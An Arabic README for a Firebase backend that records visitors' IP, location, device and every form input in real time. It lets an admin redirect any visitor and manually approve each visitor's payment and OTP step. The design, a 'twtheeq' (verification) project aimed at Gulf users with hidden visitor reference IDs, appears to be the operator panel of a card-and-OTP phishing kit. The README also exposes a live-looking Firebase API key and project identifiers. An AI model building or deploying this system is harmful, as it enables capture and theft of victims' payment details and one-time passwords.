# Firebase Backend - نظام التتبع الكامل

## 📋 الميزات

### 1️⃣ تتبع الزوار التلقائي
- رقم مرجعي فريد لكل زائر (مخفي)
- معلومات الدولة والمدينة
- نوع المتصفح ونظام التشغيل
- نوع الجهاز
- IP Address

### 2️⃣ حفظ البيانات Real-time
- حفظ تلقائي لكل input بعد 500ms
- تحديث `lastUpdated` مع كل إدخال
- ترابط كامل للبيانات لكل زائر

### 3️⃣ نظام Online/Offline
- تحديث الحالة كل 30 ثانية
- معرفة الزوار المتصلين حالياً

### 4️⃣ نظام التوجيه من الأدمن
- توجيه أي زائر لأي صفحة
- فحص الأوامر كل 3 ثوان

### 5️⃣ نظام الموافقة/الرفض
- موافقة/رفض على الدفع
- موافقة/رفض على OTP

---

## 🗂️ بنية البيانات في Firestore

```
visitors/
  └── {vid}
      ├── vid: "v_1234567890_abc123"
      ├── ref: "REF-A1B2C3D4-567890"
      ├── ip: "123.45.67.89"
      ├── country: "Saudi Arabia"
      ├── city: "Riyadh"
      ├── browser: "Chrome 120"
      ├── os: "Windows 10"
      ├── device: "Desktop"
      ├── online: true
      ├── page: "/step3"
      ├── created: "2024-12-15T10:30:00.000Z"
      ├── lastSeen: "2024-12-15T10:35:00.000Z"
      ├── lastUpdated: "2024-12-15T10:35:30.000Z"  ← للترتيب
      │
      ├── data/
      │   ├── step1/
      │   │   ├── field1: "value1"
      │   │   ├── field2: "value2"
      │   │   └── timestamp: "2024-12-15T10:31:00.000Z"
      │   ├── step3/
      │   │   ├── field1: "value1"
      │   │   └── timestamp: "2024-12-15T10:33:00.000Z"
      │   └── ...
      │
      ├── redirect/
      │   ├── targetPage: "/step5"
      │   ├── timestamp: "2024-12-15T10:34:00.000Z"
      │   └── executed: false
      │
      ├── payment/
      │   ├── approved: false
      │   └── approvedAt: null
      │
      └── otp/
          ├── approved: false
          └── approvedAt: null
```

---

## 🔌 Admin APIs

### 1. الحصول على جميع الزوار (مرتبين حسب آخر تحديث)
```
GET /api/admin/visitors
```

**Response:**
```json
{
  "success": true,
  "visitors": [...],
  "count": 10
}
```

---

### 2. الحصول على زائر محدد
```
GET /api/admin/visitor/:vid
```

**Response:**
```json
{
  "success": true,
  "visitor": {...}
}
```

---

### 3. الحصول على الزوار المتصلين
```
GET /api/admin/visitors/online
```

---

### 4. توجيه زائر
```
POST /api/admin/redirect-visitor
Body: {
  "vid": "v_1234567890_abc123",
  "targetPage": "/step5"
}
```

---

### 5. الموافقة على الدفع
```
POST /api/admin/approve-payment
Body: {
  "vid": "v_1234567890_abc123",
  "approved": true
}
```

---

### 6. الموافقة على OTP
```
POST /api/admin/approve-otp
Body: {
  "vid": "v_1234567890_abc123",
  "approved": true
}
```

---

### 7. إحصائيات شاملة
```
GET /api/admin/statistics
```

**Response:**
```json
{
  "success": true,
  "stats": {
    "total": 100,
    "online": 25,
    "countries": {
      "Saudi Arabia": 60,
      "UAE": 30,
      "Qatar": 10
    },
    "devices": {
      "Desktop": 70,
      "Mobile": 25,
      "Tablet": 5
    },
    "browsers": {
      "Chrome": 60,
      "Safari": 30,
      "Firefox": 10
    }
  }
}
```

---

## ⚙️ Environment Variables

يجب إضافة هذه المتغيرات على Vercel:

```
FIREBASE_API_KEY=AIzaSyCumuEb5pKVwDGJDxU7YvPJs55q-YDHPHU
FIREBASE_AUTH_DOMAIN=twtheeq-8785a.firebaseapp.com
FIREBASE_PROJECT_ID=twtheeq-8785a
FIREBASE_STORAGE_BUCKET=twtheeq-8785a.firebasestorage.app
FIREBASE_MESSAGING_SENDER_ID=1015417316604
FIREBASE_APP_ID=1:1015417316604:web:aa39dea41379dd1b372379
FIREBASE_SERVICE_ACCOUNT_KEY={"type":"service_account",...}
NODE_ENV=production
```

---

## 📊 ترتيب الزوار في Dashboard

**الزوار يُرتبون حسب `lastUpdated` (آخر إدخال بيانات):**

- **ليس** حسب وقت الدخول (`created`)
- **ليس** حسب آخر ظهور (`lastSeen`)
- **بل** حسب آخر تحديث للبيانات (`lastUpdated`)

**مثال:**
```
الزائر A - دخل 10:00 - آخر إدخال: 10:05
الزائر B - دخل 09:00 - آخر إدخال: 10:10  ← يظهر أولاً
الزائر C - دخل 11:00 - آخر إدخال: 10:02
```

**الترتيب في Dashboard:**
1. الزائر B (lastUpdated: 10:10) 🔝
2. الزائر A (lastUpdated: 10:05)
3. الزائر C (lastUpdated: 10:02)

---

## 🚀 التشغيل

### محلياً:
```bash
npm install
npm start
```

### على Vercel:
1. أضف Environment Variables
2. Push إلى GitHub
3. Vercel سينشر تلقائياً

---

## 🔒 الأمان

- ✅ جميع المعلومات الحساسة في `.env`
- ✅ `.gitignore` يحمي الملفات الحساسة
- ✅ Service Account JSON لا يُرفع على GitHub
- ✅ الرقم المرجعي مخفي عن الزائر

---

## ✅ الملفات المضافة

1. `firebase-config.js` - إعداد Firebase Admin
2. `sys-track.js` - تتبع الزوار
3. `data-save.js` - حفظ البيانات
4. `admin-api.js` - Admin APIs
5. `public/client-track.js` - التتبع من جانب العميل
6. `server.js` - محدث مع جميع الأنظمة
7. `.env.example` - مثال على المتغيرات

---

**المشروع جاهز للاستخدام! 🎉**
